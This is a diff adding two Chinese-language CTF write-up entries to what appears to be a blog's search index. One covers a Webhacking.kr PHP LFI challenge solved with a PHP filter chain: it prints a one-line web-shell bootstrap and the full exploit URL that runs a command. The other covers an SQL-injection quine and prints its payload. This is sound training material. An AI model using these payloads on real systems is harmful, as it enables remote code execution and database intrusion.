@@ -29325,4 +29325,126 @@ entry point；它不包含任何真实 cookie：</p>
         <tag>blind-sql-injection</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Webhacking.kr old-25 RevengE</title>
+    <url>/wp/webhacking/old-25-revenge/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Read <code>flag.txt</code> despite the server-appended
+<code>.php</code> suffix.</p>
+<p>在服务端自动追加 <code>.php</code> 的情况下读取
+<code>flag.txt</code>。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">http://webhacking.kr:10017/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>题目会把 <code>file</code> 参数作为资源名并追加
+<code>.php</code>。普通 LFI 因此会请求错误的文件名。利用 PHP filter
+chain，可以把 bootstrap 写入 <code>php://temp</code>，再通过
+<code>action=include</code> 执行；bootstrap 从 GET 参数 <code>0</code>
+取命令并执行：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">0</span>]`;;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="filter-chain">Filter Chain</h3>
+<p>这条链是为了在不能直接写文件的条件下构造一段可执行的 PHP
+源码。构造目标先固定为 bootstrap：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">0</span>]`;;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>它的 Base64 是
+<code>PD89YCRfR0VUWzBdYDs7Pz4=</code>。链条需要把输入流最终变成这段源码，并让
+<code>include()</code> 把生成结果当作 PHP 解释。</p>
+<p>链条按以下逻辑组合：</p>
+<ol type="1">
+<li><code>php://filter</code> 提供 stream filter
+的入口，<code>resource=php://temp</code> 作为临时资源。题目会给
+<code>file</code> 追加 <code>.php</code>，所以使用 wrapper
+资源绕过普通文件名拼接。</li>
+<li><code>convert.iconv.*</code>
+负责在不同字符集之间转换。特定编码转换会产生或保留可控的前缀字节，作为构造
+Base64 字符串的中间步骤。这里的编码名称不是随意排列，每一组都来自
+generator 对目标字节的搜索结果。</li>
+<li><code>convert.base64-encode</code> 把当前字节流稳定地表示成
+Base64；<code>convert.base64-decode</code>
+删除不需要的中间字符并还原下一轮转换所需的字节流。两者交替出现，是为了让后续
+iconv 转换继续作用在可控的 Base64 数据上。</li>
+<li><code>convert.iconv.UTF8.UTF7</code>
+等转换用于改变字节表示，避免中间结果直接出现无法继续处理的字符。后续
+iconv 组继续修正编码和字节边界，直到输出目标 Base64。</li>
+<li>链尾的 <code>convert.base64-decode</code> 把目标 Base64 还原成
+bootstrap 源码；<code>/resource=php://temp</code> 指定生成内容的临时
+stream，<code>action=include</code> 触发包含操作。</li>
+<li>被包含的 bootstrap 从 GET 参数 <code>0</code> 读取命令，因此
+<code>0=cat+flag.txt</code> 才是执行阶段的输入。filter chain
+负责生成代码，<code>0</code>
+负责提供代码执行后的命令，两者是两个独立阶段。</li>
+</ol>
+<p>这条链很长，是因为 iconv filter
+只能通过有限的字符集转换逐步改变字节流。generator 会根据目标 PHP 源码的
+Base64 表示搜索可用的转换序列，并在每个中间阶段插入 Base64 encode/decode
+重新建立稳定的字符集边界。手工删除其中一个转换或交换顺序，都会改变中间字节，最终可能得到空输出、错误编码或不可执行的
+PHP。</p>
+<h3 id="solution">Solution</h3>
+<p>下面的请求使用上述 filter chain 生成 bootstrap，并把结果落到
+<code>php://temp</code>。<code>action=include</code> 触发 include，参数
+<code>0</code> 则让 bootstrap 执行 <code>cat flag.txt</code>：</p>
+<p>请求 URL 的 host 是题目服务地址；下面给出路径和查询字符串，host
+使用当前 challenge 服务地址：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/?file=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP866.CSUNICODE%7Cconvert.iconv.CSISOLATIN5.ISO_6937-2%7Cconvert.iconv.CP950.UTF-16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.865.UTF16%7Cconvert.iconv.CP901.ISO6937%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.iconv.ISO-IR-103.850%7Cconvert.iconv.PT154.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP367.UTF-16%7Cconvert.iconv.CSIBM901.SHIFT_JISX0213%7Cconvert.iconv.UHC.CP1361%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.GBK.BIG5%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP861.UTF-16%7Cconvert.iconv.L4.GB13000%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.865.UTF16%7Cconvert.iconv.CP901.ISO6937%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP861.UTF-16%7Cconvert.iconv.L4.GB13000%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.UTF16LE%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.iconv.UCS2.UTF8%7Cconvert.iconv.8859_3.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.PT.UTF32%7Cconvert.iconv.KOI8-U.IBM-932%7Cconvert.iconv.SJIS.EUCJP-WIN%7Cconvert.iconv.L10.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP367.UTF-16%7Cconvert.iconv.CSIBM901.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.PT.UTF32%7Cconvert.iconv.KOI8-U.IBM-932%7Cconvert.iconv.SJIS.EUCJP-WIN%7Cconvert.iconv.L10.UCS4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP367.UTF-16%7Cconvert.iconv.CSIBM901.SHIFT_JISX0213%7Cconvert.iconv.UHC.CP1361%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.ISO2022KR.UTF16%7Cconvert.iconv.L6.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&amp;action=include&amp;0=cat+flag.txt</span><br></pre></td></tr></table></figure>
+<p>该 filter chain 依赖目标 PHP 版本与可用的 iconv
+filter；更换部署时需根据响应确认链条是否有效。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>php</tag>
+        <tag>lfi</tag>
+        <tag>php-filter</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr ouroboros golf</title>
+    <url>/wp/webhacking/ouroboros-golf/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Use a self-reproducing SQL expression (quine SQLi).</p>
+<p>使用能生成自身的 SQL expression。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/new-12/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>服务端把 <code>pw</code> 放进单引号包围的查询，并要求查询结果中的
+<code>pw</code> 与原始输入完全相等。普通 UNION SQLi
+虽然能控制返回值，却不会自动生成完整 payload；这里需要让 SQL
+查询返回它自己的源码，也就是 SQL quine。</p>
+<p>关键点不是“查出一个已知密码”，而是让 <code>UNION SELECT</code>
+的结果恰好等于整个输入字符串。</p>
+<h3 id="solution">Solution</h3>
+<p>使用的 payload：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#x27; union select replace(replace(\&quot; union select replace(replace(\&quot;$\&quot;,0x22,0x27),0x24,\&quot;$\&quot;)#&#x27;,0x22,0x27),0x24,&#x27;\&quot; union select replace(replace(\&quot;$\&quot;,0x22,0x27),0x24,\&quot;$\&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
+<p><code>$</code> 是模板占位符，<code>0x22</code> 和 <code>0x27</code>
+分别表示双引号和单引号。把 payload 抽象成模板 <code>T</code>
+后，查询中的表达式相当于：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">replace(replace(T, <span class="number">0x22</span>, <span class="number">0x27</span>), <span class="number">0x24</span>, T)</span><br></pre></td></tr></table></figure>
+<p>执行过程分两步：</p>
+<ol type="1">
+<li>外层 <code>replace()</code> 把模板中的双引号还原成 payload
+需要的单引号。</li>
+<li>内层 <code>replace()</code> 把 <code>$</code>
+替换成已经还原后的模板，于是结果就是完整 payload 本身。</li>
+</ol>
+<p>开头的单引号闭合原查询字符串，<code>UNION SELECT</code>
+返回生成后的字符串，末尾的 <code>#</code> 注释掉原查询剩余部分。</p>
+<p>最终响应中的 <code>Pw</code> 与输入一致，满足题目的比较条件。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+        <tag>quine</tag>
+      </tags>
+  </entry>
 </search>
